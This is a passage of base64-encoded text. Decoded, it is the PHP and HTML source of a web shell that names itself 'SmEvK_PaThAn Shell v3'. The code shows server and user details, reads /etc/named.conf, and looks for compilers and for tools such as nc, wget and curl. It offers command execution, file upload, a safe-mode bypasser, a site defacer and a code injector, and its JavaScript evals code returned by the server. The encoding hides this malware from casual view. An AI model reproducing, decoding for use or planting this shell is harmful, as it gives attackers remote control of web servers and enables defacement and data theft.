L3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwogICAgICAgICAgICAgICAgcmVxLnNlbmQocGFyYW1zKTsKICAgICAgICAgICAgfSAKICAgICAgICAgICAgZWxzZSBpZiAod2luZG93LkFjdGl2ZVhPYmplY3QpIHsKICAgICAgICAgICAgICAgIHJlcSA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNaWNyb3NvZnQuWE1MSFRUUCIpOwogICAgICAgICAgICAgICAgaWYgKHJlcSkgewogICAgICAgICAgICAgICAgICAgIHJlcS5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBwcm9jZXNzUmVxQ2hhbmdlOwogICAgICAgICAgICAgICAgICAgIHJlcS5vcGVuKCJQT1NUIiwgdXJsLCB0cnVlKTsKICAgICAgICAgICAgICAgICAgICByZXEuc2V0UmVxdWVzdEhlYWRlciAoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgICAgICAgICAgICAgICAgICByZXEuc2VuZChwYXJhbXMpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIHByb2Nlc3NSZXFDaGFuZ2UoKSB7CiAgICAgICAgICAgIGlmKCAocmVxLnJlYWR5U3RhdGUgPT0gNCkgKQogICAgICAgICAgICAgICAgaWYocmVxLnN0YXR1cyA9PSAyMDApIHsKICAgICAgICAgICAgICAgICAgICAvL2FsZXJ0KHJlcS5yZXNwb25zZVRleHQpOwogICAgICAgICAgICAgICAgICAgIHZhciByZWcgPSBuZXcgUmVnRXhwKCIoXFxkKykoW1xcU1xcc10qKSIsICJtIik7CiAgICAgICAgICAgICAgICAgICAgdmFyIGFycj1yZWcuZXhlYyhyZXEucmVzcG9uc2VUZXh0KTsKICAgICAgICAgICAgICAgICAgICBldmFsKGFyclsyXS5zdWJzdHIoMCwgYXJyWzFdKSk7CiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZSBhbGVydCgiUmVxdWVzdCBlcnJvciEiKTsKICAgICAgICB9CiAgICA8L3NjcmlwdD4KICAgIDxoZWFkPjxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1BdWRpb3dpZGUiID48L2hlYWQ+PGJvZHk+PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7d2lkdGg6MTAwJTt0b3A6MDtsZWZ0OjA7Ij48ZGl2IHN0eWxlPSJtYXJnaW46NXB4O2JhY2tncm91bmQ6YmxhY2s7Ij48ZGl2IGNsYXNzPSJjb250ZW50IiBzdHlsZT0iYm9yZGVyOjFweCBzb2xpZCAnIC4gJFRoZW1lIC4gJzsgYm9yZGVyLXJhZGl1czo1cHg7Ij4KICAgIDxmb3JtIG1ldGhvZD1wb3N0IG5hbWU9bWYgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPgogICAgICAgIDxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9IicgLiAoaXNzZXQoJF9QT1NUWydhJ10pID8gJF9QT1NUWydhJ10gOiAnJykgLiAnIj4KICAgICAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1jIHZhbHVlPSInIC4gaHRtbHNwZWNpYWxjaGFycygkR0xPQkFMU1snY3dkJ10pIC4gJyI+CiAgICAgICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9cDEgdmFsdWU9IicgLiAoaXNzZXQoJF9QT1NUWydwMSddKSA/IGh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwMSddKSA6ICcnKSAuICciPgogICAgICAgIDxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXAyIHZhbHVlPSInIC4gKGlzc2V0KCRfUE9TVFsncDInXSkgPyBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDInXSkgOiAnJykgLiAnIj4KICAgICAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1wMyB2YWx1ZT0iJyAuIChpc3NldCgkX1BPU1RbJ3AzJ10pID8gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AzJ10pIDogJycpIC4gJyI+CiAgICAgICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Y2hhcnNldCB2YWx1ZT0iJyAuIChpc3NldCgkX1BPU1RbJ2NoYXJzZXQnXSkgPyAkX1BPU1RbJ2NoYXJzZXQnXSA6ICcnKSAuICciPgogICAgPC9mb3JtPic7CiAgICAkZnJlZVNwYWNlICAgICAgICAgPSBAZGlza2ZyZWVzcGFjZSgkR0xPQkFMU1snY3dkJ10pOwogICAgJHRvdGFsU3BhY2UgICAgICAgID0gQGRpc2tfdG90YWxfc3BhY2UoJEdMT0JBTFNbJ2N3ZCddKTsKICAgICR0b3RhbFNwYWNlICAgICAgICA9ICR0b3RhbFNwYWNlID8gJHRvdGFsU3BhY2UgOiAxOwogICAgJGRpc2FibGVfZnVuY3Rpb25zID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAkcmVsZWFzZSAgICAgICAgICAgPSBAcGhwX3VuYW1lKCdyJyk7CiAgICAka2VybmVsICAgICAgICAgICAgPSBAcGhwX3VuYW1lKCdzJyk7CiAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKSB7CiAgICAgICAgJHVzZXIgID0gQGdldF9jdXJyZW50X3VzZXIoKTsKICAgICAgICAkdWlkICAgPSBAZ2V0bXl1aWQoKTsKICAgICAgICAkZ2lkICAgPSBAZ2V0bXlnaWQoKTsKICAgICAgICAkZ3JvdXAgPSAiPyI7CiAgICB9IGVsc2UgewogICAgICAgICR1aWQgICA9IEBwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKTsKICAgICAgICAkZ2lkICAgPSBAcG9zaXhfZ2V0Z3JnaWQoQHBvc2l4X2dldGVnaWQoKSk7CiAgICAgICAgJHVzZXIgID0gJHVpZFsnbmFtZSddOwogICAgICAgICR1aWQgICA9ICR1aWRbJ3VpZCddOwogICAgICAgICRncm91cCA9ICRnaWRbJ25hbWUnXTsKICAgICAgICAkZ2lkICAgPSAkZ2lkWydnaWQnXTsKICAgIH0KICAgICRjd2RfbGlua3MgPSAnJzsKICAgICRwYXRoICAgICAgPSBleHBsb2RlKCIvIiwgJEdMT0JBTFNbJ2N3ZCddKTsKICAgICRuICAgICAgICAgPSBjb3VudCgkcGF0aCk7CiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbiAtIDE7ICRpKyspIHsKICAgICAgICAkY3dkX2xpbmtzIC49ICI8YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNNYW5cIixcIiI7CiAgICAgICAgZm9yICgkaiA9IDA7ICRqIDw9ICRpOyAkaisrKQogICAgICAgICAgICAkY3dkX2xpbmtzIC49ICRwYXRoWyRqXSAuICcvJzsKICAgICAgICAkY3dkX2xpbmtzIC49ICJcIiknPiIgLiAkcGF0aFskaV0gLiAiLzwvYT4iOwogICAgfQogICAgJGNoYXJzZXRzICAgICA9IGFycmF5KAogICAgICAgICdVVEYtOCcsCiAgICAgICAgJ1dpbmRvd3MtMTI1MScsCiAgICAgICAgJ0tPSTgtUicsCiAgICAgICAgJ0tPSTgtVScsCiAgICAgICAgJ2NwODY2JwogICAgKTsKICAgICRvcHRfY2hhcnNldHMgPSAnJzsKICAgIGZvcmVhY2ggKCRjaGFyc2V0cyBhcyAkaXRlbSkKICAgICAgICAkb3B0X2NoYXJzZXRzIC49ICc8b3B0aW9uIHZhbHVlPSInIC4gJGl0ZW0gLiAnIiAnIC4gKCRfUE9TVFsnY2hhcnNldCddID09ICRpdGVtID8gJ3NlbGVjdGVkJyA6ICcnKSAuICc+JyAuICRpdGVtIC4gJzwvb3B0aW9uPic7CiAgICAkbSA9IGFycmF5KAogICAgICAgICdTZWMuIEluZm8nID0+ICdTZWNJbmZvJywKICAgICAgICAnRmlsZXMnID0+ICdGaWxlc01hbicsCiAgICAgICAgJ0NvbnNvbGUnID0+ICdDb25zb2xlJywKICAgICAgICAnQnlwYXNzZXInID0+ICdTYWZlTW9kZScsCiAgICAgICAgJ1NhZmUgTW9kZScgPT4gJ0J5cGFzcycsCiAgICAgICAgJ1N0cmluZyB0b29scycgPT4gJ1N0cmluZ1Rvb2xzJywKICAgICAgICAnSW1wb3J0IFNjcmlwdHMnID0+ICdJbXBvcnRTY3JpcHRzJywKICAgICAgICAnTmV0d29yaycgPT4gJ05ldHdvcmsnLAogICAgICAgICdSZWFkYWJsZSBEaXJzJyA9PiAnUmVhZGFibGUnLAogICAgICAgICdEZWZhY2VyJyA9PiAnRGVmYWNlJywKICAgICAgICAnQ29kZSBJbmplY3RvcicgPT4gJ0luamVjdG9yJywKICAgICAgICAnRG9tYWlucycgPT4gJ0RvbWFpbicKICAgICk7CiAgICBpZiAoIWVtcHR5KCRHTE9CQUxTWydhdXRoX3Bhc3MnXSkpCiAgICAgICAgJG1bJ0xvZ291dCddID0gJ0xvZ291dCc7CiAgICAkbWVudSA9ICcnOwogICAgZm9yZWFjaCAoJG0gYXMgJGsgPT4gJHYpCiAgICAgICAgJG1lbnUgLj0gJzx0aD48YSBocmVmPSIjIiBvbmNsaWNrPSJnKFwnJyAuICR2IC4gJ1wnLG51bGwsXCdcJyxcJ1wnLFwnXCcpIj4nIC4gJGsgLiAnPC9hPjwvdGg+JzsKICAgICRkcml2ZXMgPSAiIjsKICAgIGlmICgkR0xPQkFMU1snb3MnXSA9PSAnd2luJykgewogICAgICAgIGZvcmVhY2ggKHJhbmdlKCdhJywgJ3onKSBhcyAkZHJpdmUpIHsKICAgICAgICAgICAgaWYgKGlzX2RpcigkZHJpdmUgLiAnOlxcJykpCiAgICAgICAgICAgICAgICAkZHJpdmVzIC49ICc8YSBocmVmPSIjIiBvbmNsaWNrPSJnKFwnRmlsZXNNYW5cJyxcJycgLiAkZHJpdmUgLiAnOi9cJykiPlsgJyAuICRkcml2ZSAuICcgXTwvYT4gJzsKICAgICAgICB9CiAgICAgICAgJGRyaXZlcyAuPSAnPGJyIC8+OiAnOwogICAgfQogICAgaWYgKCRHTE9CQUxTWydvcyddID09ICduaXgnKSB7CiAgICAgICAgJGRvbWluaW9zID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL25hbWVkLmNvbmYiKTsKICAgICAgICBpZiAoISRkb21pbmlvcykgewogICAgICAgICAgICAkRG9tYWluUyAgICAgICAgPSAiL3Zhci9uYW1lZCI7CiAgICAgICAgICAgICREb21haW5vbnNlcnZlciA9IHNjYW5kaXIoJERvbWFpblMpOwogICAgICAgICAgICAkZDBjICAgICAgICAgICAgPSBjb3VudCgkRG9tYWlub25zZXJ2ZXIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIEBwcmVnX21hdGNoX2FsbCgnLy4qP3pvbmUgIiguKj8pIiB7LycsICRkb21pbmlvcywgJG91dCk7CiAgICAgICAgICAgICRvdXQgPSBzaXplb2YoYXJyYXlfdW5pcXVlKCRvdXRbMV0pKTsKICAgICAgICAgICAgJGQwYyA9ICRvdXQgLiAiICBEb21haW5zIjsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgICRkMGMgPSAiTm90aGluZyBoZXJlIGJybzooIjsKICAgIH0KICAgIGlmICgkR0xPQkFMU1snb3MnXSA9PSAnbml4JykgewogICAgICAgICR1c2VmbCAgPSAnJzsKICAgICAgICAkZHdubGRyID0gJyc7CiAgICAgICAgaWYgKCFAaW5pX2dldCgnc2FmZV9tb2RlJykpIHsKICAgICAgICAgICAgJHRlbXAgICAgPSBhcnJheSgpOwogICAgICAgICAgICAkdXNlcmZ1bCA9IGFycmF5KAogICAgICAgICAgICAgICAgJ2djYycsCiAgICAgICAgICAgICAgICAnbGNjJywKICAgICAgICAgICAgICAgICdjYycsCiAgICAgICAgICAgICAgICAnbGQnLAogICAgICAgICAgICAgICAgJ21ha2UnLAogICAgICAgICAgICAgICAgJ3BocCcsCiAgICAgICAgICAgICAgICAncGVybCcsCiAgICAgICAgICAgICAgICAncHl0aG9uJywKICAgICAgICAgICAgICAgICdydWJ5JywKICAgICAgICAgICAgICAgICd0YXInLAogICAgICAgICAgICAgICAgJ2d6aXAnLAogICAgICAgICAgICAgICAgJ2J6aXAnLAogICAgICAgICAgICAgICAgJ2J6aXAyJywKICAgICAgICAgICAgICAgICduYycsCiAgICAgICAgICAgICAgICAnbG9jYXRlJywKICAgICAgICAgICAgICAgICdzdWlkcGVybCcKICAgICAgICAgICAgKTsKICAgICAgICAgICAgZm9yZWFjaCAoJHVzZXJmdWwgYXMgJGl0ZW0pIHsKICAgICAgICAgICAgICAgIGlmICh3aGljaCgkaXRlbSkpCiAgICAgICAgICAgICAgICAgICAgJHRlbXBbXSA9ICRpdGVtOwogICAgICAgICAgICB9CiAgICAgICAgICAgICR1c2VmbCAgICAgICA9IGltcGxvZGUoJywgJywgJHRlbXApOwogICAgICAgICAgICAkdGVtcCAgICAgICAgPSBhcnJheSgpOwogICAgICAgICAgICAkZG93bmxvYWRlcnMgPSBhcnJheSgKICAgICAgICAgICAgICAgICd3Z2V0JywKICAgICAgICAgICAgICAgICdmZXRjaCcsCiAgICAgICAgICAgICAgICAnbHlueCcsCiAgICAgICAgICAgICAgICAnbGlua3MnLAogICAgICAgICAgICAgICAgJ2N1cmwnLAogICAgICAgICAgICAgICAgJ2dldCcsCiAgICAgICAgICAgICAgICAnbHdwLW1pcnJvcicKICAgICAgICAgICAgKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGRvd25sb2FkZXJzIGFzICRpdGVtMikgewogICAgICAgICAgICAgICAgaWYgKHdoaWNoKCRpdGVtMikpCiAgICAgICAgICAgICAgICAgICAgJHRlbXBbXSA9ICRpdGVtMjsKICAgICAgICAgICAgfQogICAgICAgICAgICAkZHdubGRyID0gaW1wbG9kZSgnLCAnLCAkdGVtcCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHVzZWZsICA9ICcgLS0tLS0tLSAnOwogICAgICAgICAgICAkZHdubGRyID0gJyAtLS0tLS0tICc7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICAkdXNlZmwgID0gJyAtLS0tLS0tICc7CiAgICAgICAgJGR3bmxkciA9ICcgLS0tLS0tLSAnOwogICAgfQogICAgZWNobyAnPGRpdiBjbGFzcz0ic21ldmtsb2dvIj48dGFibGUgY2xhc3M9ImluZm8iIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCIgd2lkdGg9IjEwMCUiPjx0cj4KICAgICAgICAgIDx0ZD48dGFibGUgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIwIiBjbGFzcz0ibnBvYWQiPjx0cj48dGQgd2lkdGg9IjgwcHg7Ij48c3Bhbj5VbmFtZTwvc3Bhbj48L3RkPjx0ZD46IDxub2JyPicgLiBzdWJzdHIoQHBocF91bmFtZSgpLCAwLCAxMjApIC4gJzwvbm9icj48L3RkPjwvdHI+CiAgICAgICAgICA8dHI+PHRkPjxzcGFuPlVzZXI8L3NwYW4+PC90ZD48dGQ+OiAnIC4gJHVpZCAuICcgKCAnIC4gJHVzZXIgLiAnICkgPHNwYW4+R3JvdXA6IDwvc3Bhbj4gJyAuICRnaWQgLiAnICggJyAuICRncm91cCAuICcgKTwvdGQ+PC90cj48dHI+PHRkPjxzcGFuPlNlcnZlcjwvc3Bhbj48L3RkPjx0ZD46ICcgLiBAZ2V0ZW52KCdTRVJWRVJfU09GVFdBUkUnKSAuICc8L3RkPjwvdHI+PHRyPjx0ZD48c3Bhbj5Vc2VmdWw8L3NwYW4+PC90ZD48dGQ+OiAnIC4gJHVzZWZsIC4gJzwvdGQ+PC90cj48dHI+PHRkPjxzcGFuPkRvd25sb2FkZXJzPC9zcGFuPjwvdGQ+PHRkPjogJyAuICRkd25sZHIgLiAnPC90ZD48L3RyPjx0cj48dGQ+PHNwYW4+RC9mdW5jdGlvbnM8L3NwYW4+PC90ZD48dGQ+OiAnIC4gKCRkaXNhYmxlX2Z1bmN0aW9ucyA/ICRkaXNhYmxlX2Z1bmN0aW9ucyA6ICdBbGwgRnVuY3Rpb24gRW5hYmxlJykgLiAnPC90ZD48L3RyPjx0cj48dGQ+PHNwYW4+JyAuICgkR0xPQkFMU1snb3MnXSA9PSAnd2luJyA/ICdEcml2ZXM8YnIgLz5Dd2QnIDogJ0N3ZCcpIC4gJzwvc3Bhbj48L3RkPjx0ZD46ICcgLiAkZHJpdmVzIC4gJycgLiAkY3dkX2xpbmtzIC4gJyAnIC4gdmlld1Blcm1zQ29sb3IoJEdMT0JBTFNbJ2N3ZCddKSAuICcgPGEgaHJlZj0jIG9uY2xpY2s9ImcoXCdGaWxlc01hblwnLFwnJyAuICRHTE9CQUxTWydob21lX2N3ZCddIC4gJ1wnLFwnXCcsXCdcJyxcJ1wnKSI+WyBob21lIF08L2E+PC90ZD48L3RyPjwvdGFibGU+PC90ZD4nIC4gJzx0ZCB3aWR0aD00Pjxub2JyPjxzcGFuPlN2IElQPC9zcGFuPjxicj48c3Bhbj5Zb3VyIElQPC9zcGFuPjxiciAvPjxzcGFuPkhERDwvc3Bhbj48YnIgLz48c3Bhbj5GcmVlPC9zcGFuPjxiciAvPjxzcGFuPlBIUDwvc3Bhbj48YnIgLz48c3Bhbj5TYWZlIE1vZGU8L3NwYW4+PGJyIC8+PHNwYW4+RG9tYWluczwvc3Bhbj48L25vYnI+PC90ZD4nIC4gJzx0ZD48bm9icj46ICcgLiBnZXRob3N0YnluYW1lKCRfU0VSVkVSWyJIVFRQX0hPU1QiXSkgLiAnPGJyPjogJyAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gJzxiciAvPjogJyAuIHZpZXdTaXplKCR0b3RhbFNwYWNlKSAuICc8YnIgLz46ICcgLiB2aWV3U2l6ZSgkZnJlZVNwYWNlKSAuICcgKCcgLiAoaW50KSAoJGZyZWVTcGFjZSAvICR0b3RhbFNwYWNlICogMTAwKSAuICclKTxicj46ICcgLiBAcGhwdmVyc2lvbigpIC4gJyA8YSBocmVmPSMgb25jbGljaz0iZyhcJ1BocFwnLG51bGwsbnVsbCxcJ2luZm9cJykiPlsgcGhwaW5mbyBdPC9hPjxiciAvPjogJyAuICgkR0xPQkFMU1snc2FmZV9tb2RlJ10gPyAnPGZvbnQgY29sb3I9cmVkPk9OPC9mb250PicgOiAnPGZvbnQgY29sb3I9JyAuICRjb2xvciAuICc8Yj5PRkY8L2I+PC9mb250PicpIC4gJzxiciAvPjogJyAuICRkMGMgLiAnPC9ub2JyPjwvdGQ+PC90cj48L3RhYmxlPjwvZGl2PicgLiAnPC9kaXY+PC9kaXY+PGRpdiBzdHlsZT0ibWFyZ2luOjU7YmFja2dyb3VuZDpibGFjazsiPjxkaXYgY2xhc3M9ImNvbnRlbnQiIHN0eWxlPSJib3JkZXItdG9wOjVweCBzb2xpZCA0MzAzMDM7cGFkZGluZzoycHg7Ij48dGFibGUgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIwIiB3aWR0aD0iMTAwJSIgY2xhc3M9Im1lbnUiPjx0cj4nIC4gJG1lbnUgLiAnPC90cj48L3RhYmxlPjwvZGl2PjwvZGl2PjxkaXYgc3R5bGU9Im1hcmdpbjo1O2JhY2tncm91bmQ6YmxhY2s7Ij4nOwp9CgpmdW5jdGlvbiBwcmludEZvb3RlcigpCnsKICAgICRpc193cml0YWJsZSA9IGlzX3dyaXRhYmxlKCRHTE9CQUxTWydjd2QnXSkgPyAiPGZvbnQgY29sb3I9Z3JlZW4+WyBXcml0ZWFibGUgXTwvZm9udD4iIDogIjxmb250IGNvbG9yPXJlZD5bIE5vdCB3cml0YWJsZSBdPC9mb250PiI7CiAgICAKICAgIGVjaG8gJzwvZGl2PjxkaXYgc3R5bGU9Im1hcmdpbjo1cHg7YmFja2dyb3VuZDpibGFjazsiPjxkaXYgY2xhc3M9ImNvbnRlbnQiIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkICcgLiAkVGhlbWUgLiAnOyBib3JkZXItcmFkaXVzOjVweDsiPgo8dGFibGUgY2xhc3M9ImluZm8iIGlkPSJ0b29sc1RibCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIwIiB3aWR0aD0iMTAwJSI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxmb3JtIG9uc3VibWl0PSJnKG51bGwsdGhpcy5jLnZhbHVlKTtyZXR1cm4gZmFsc2U7Ij48c3Bhbj5DaGFuZ2UgZGlyOjwvc3Bhbj48YnI+PGlucHV0IGNsYXNzPSJ0b29sc0lucCIgdHlwZT10ZXh0IG5hbWU9YyB2YWx1ZT0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKSAuICciPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48L3RkPgogICAgICAgIDx0ZD48Zm9ybSBvbnN1Ym1pdD0iZyhcJ0ZpbGVzVG9vbHNcJyxudWxsLHRoaXMuZi52YWx1ZSk7cmV0dXJuIGZhbHNlOyI+PHNwYW4+UmVhZCBmaWxlOjwvc3Bhbj48YnI+PGlucHV0IGNsYXNzPSJ0b29sc0lucCIgdHlwZT10ZXh0IG5hbWU9Zj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxmb3JtIG9uc3VibWl0PSJnKFwnRmlsZXNNYW5cJyxudWxsLFwnbWtkaXJcJyx0aGlzLmQudmFsdWUpO3JldHVybiBmYWxzZTsiPjxzcGFuPk1ha2UgZGlyOjwvc3Bhbj48YnI+PGlucHV0IGNsYXNzPSJ0b29sc0lucCIgdHlwZT10ZXh0IG5hbWU9ZD48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+JyAuICRpc193cml0YWJsZSAuICc8L3RkPgogICAgICAgIDx0ZD48Zm9ybSBvbnN1Ym1pdD0iZyhcJ0ZpbGVzVG9vbHNcJyxudWxsLHRoaXMuZi52YWx1ZSxcJ21rZmlsZVwnKTtyZXR1cm4gZmFsc2U7Ij48c3Bhbj5NYWtlIGZpbGU6PC9zcGFuPjxicj48aW5wdXQgY2xhc3M9InRvb2xzSW5wIiB0eXBlPXRleHQgbmFtZT1mPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT4nIC4gJGlzX3dyaXRhYmxlIC4gJzwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48Zm9ybSBvbnN1Ym1pdD0iZyhcJ0NvbnNvbGVcJyxudWxsLHRoaXMuYy52YWx1ZSk7cmV0dXJuIGZhbHNlOyI+PHNwYW4+RXhlY3V0ZTo8L3NwYW4+PGJyPjxpbnB1dCBjbGFzcz0idG9vbHNJbnAiIHR5cGU9dGV4dCBuYW1lPWMgdmFsdWU9IiI+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+PC9mb3JtPjwvdGQ+CiAgICAgICAgPHRkPjxmb3JtIG1ldGhvZD0icG9zdCIgRU5DVFlQRT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0iRmlsZXNNQW4iPgogICAgICAgIDxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWMgdmFsdWU9IicgLiBodG1sc3BlY2lhbGNoYXJzKCRHTE9CQUxTWydjd2QnXSkgLiAnIj4KICAgICAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1wMSB2YWx1ZT0idXBsb2FkRmlsZSI+CiAgICAgICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Y2hhcnNldCB2YWx1ZT0iJyAuIChpc3NldCgkX1BPU1RbJ2NoYXJzZXQnXSkgPyAkX1BPU1RbJ2NoYXJzZXQnXSA6ICcnKSAuICciPgogICAgICAgIDxzcGFuPlVwbG9hZCBmaWxlOjwvc3Bhbj48YnI+PGlucHV0IGNsYXNzPSJ0b29sc0lucCIgdHlwZT1maWxlIG5hbWU9Zj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+JyAuICRpc193cml0YWJsZSAuICc8L3RkPgogICAgPC90cj4KPC90YWJsZT48L2Rpdj48L2Rpdj4KPGRpdiBzdHlsZT0ibWFyZ2luOjVweDtiYWNrZ3JvdW5kOmJsYWNrOyI+PGRpdiBjbGFzcz0iY29udGVudCIgc3R5bGU9ImJvcmRlcjoycHggc29saWQgJyAuICRUaGVtZSAuICc7dGV4dC1hbGlnbjpjZW50ZXI7Zm9udC13ZWlnaHQ6Ym9sZDsgYm9yZGVyLXJhZGl1czoxMHB4O21hcmdpbjphdXRvOyB3aWR0aDo1MDA7Ij5TbUV2S19QYVRoQW4gU2hlbGwgdjMgY29kZWQgYnkgS2FzaGlmIEtoYW48L2Rpdj48L2Rpdj4KPC9kaXY+CjwvYm9keT48L2h0bWw+JzsKfQoKaWYgKCFmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldHB3dWlkIikgJiYgKHN0cnBvcygkR0xPQkFMU1snZGlzYWJsZV9mdW5jdGlvbnMnXSwgJ3Bvc2l4X2dldHB3dWlkJykgPT09IGZhbHNlKSkgewogICAgZnVuY3Rpb24gcG9zaXhfZ2V0cHd1aWQoJHApCiAgICB7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQp9CmlmICghZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRncmdpZCIpICYmIChzdHJwb3MoJEdMT0JBTFNbJ2Rpc2FibGVfZnVuY3Rpb25zJ10sICdwb3NpeF9nZXRncmdpZCcpID09PSBmYWxzZSkpIHsKICAgIGZ1bmN0aW9uIHBvc2l4X2dldGdyZ2lkKCRwKQogICAgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKCmZ1bmN0aW9uIHZpZXdTaXplKCRzKQp7CiAgICBpZiAoJHMgPj0gMTA3Mzc0MTgyNCkKICAgICAgICByZXR1cm4gc3ByaW50ZignJTEuMmYnLCAkcyAvIDEwNzM3NDE4MjQpIC4gJyBHQic7CiAgICBlbHNlaWYgKCRzID49IDEwNDg1NzYpCiAgICAgICAgcmV0dXJuIHNwcmludGYoJyUxLjJmJywgJHMgLyAxMDQ4NTc2KSAuICcgTUInOwogICAgZWxzZWlmICgkcyA+PSAxMDI0KQogICAgICAgIHJldHVybiBzcHJpbnRmKCclMS4yZicsICRzIC8gMTAyNCkgLiAnIEtCJzsKICAgIGVsc2UKICAgICAgICByZXR1cm4gJHMgLiAnIEInOwp9CgpmdW5jdGlvbiBwZXJtcygkcCkKewogICAgaWYgKCgkcCAmIDB4QzAwMCkgPT0gMHhDMDAwKQogICAgICAgICRpID0gJ3MnOwogICAgZWxzZWlmICgoJHAgJiAweEEwMDApID09IDB4QTAwMCkKICAgICAgICAkaSA9ICdsJzsKICAgIGVsc2VpZiAoKCRwICYgMHg4MDAwKSA9PSAweDgwMDApCiAgICAgICAgJGkgPSAnLSc7CiAgICBlbHNlaWYgKCgkcCAmIDB4NjAwMCkgPT0gMHg2MDAwKQogICAgICAgICRpID0gJ2InOwogICAgZWxzZWlmICgoJHAgJiAweDQwMDApID09IDB4NDAwMCkKICAgICAgICAkaSA9ICdkJzsKICAgIGVsc2VpZiAoKCRwICYgMHgyMDAwKSA9PSAweDIwMDApCiAgICAgICAgJGkgPSAnYyc7CiAgICBlbHNlaWYgKCgkcCAmIDB4MTAwMCkgPT0gMHgxMDAwKQogICAgICAgICRpID0gJ3AnOwogICAgZWxzZQogICAgICAgICRpID0gJ3UnOwogICAgJGkgLj0gKCgkcCAmIDB4MDEwMCkgPyAncicgOiAnLScpOwogICAgJGkgLj0gKCgkcCAmIDB4MDA4MCkgPyAndycgOiAnLScpOwogICAgJGkgLj0gKCgkcCAmIDB4MDA0MCkgPyAoKCRwICYgMHgwODAwKSA/ICdzJyA6ICd4JykgOiAoKCRwICYgMHgwODAwKSA/ICdTJyA6ICctJykpOwogICAgJGkgLj0gKCgkcCAmIDB4MDAyMCkgPyAncicgOiAnLScpOwogICAgJGkgLj0gKCgkcCAmIDB4MDAxMCkgPyAndycgOiAnLScpOwogICAgJGkgLj0gKCgkcCAmIDB4MDAwOCkgPyAoKCRwICYgMHgwNDAwKSA/ICdzJyA6ICd4JykgOiAoKCRwICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOwogICAgJGkgLj0gKCgkcCAmIDB4MDAwNCkgPyAncicgOiAnLScpOwogICAgJGkgLj0gKCgkcCAmIDB4MDAwMikgPyAndycgOiAnLScpOwogICAgJGkgLj0gKCgkcCAmIDB4MDAwMSkgPyAoKCRwICYgMHgwMjAwKSA/ICd0JyA6ICd4JykgOiAoKCRwICYgMHgwMjAwKSA/ICdUJyA6ICctJykpOwogICAgcmV0dXJuICRpOwp9CgpmdW5jdGlvbiB2aWV3UGVybXNDb2xvcigkZikKewogICAgaWYgKCFAaXNfcmVhZGFibGUoJGYpKQogICAgICAgIHJldHVybiAnPGZvbnQgY29sb3I9I0ZGMDAwMD48Yj4nIC4gcGVybXMoQGZpbGVwZXJtcygkZikpIC4gJzwvYj48L2ZvbnQ+JzsKICAgIGVsc2VpZiAoIUBpc193cml0YWJsZSgkZikpCiAgICAgICAgcmV0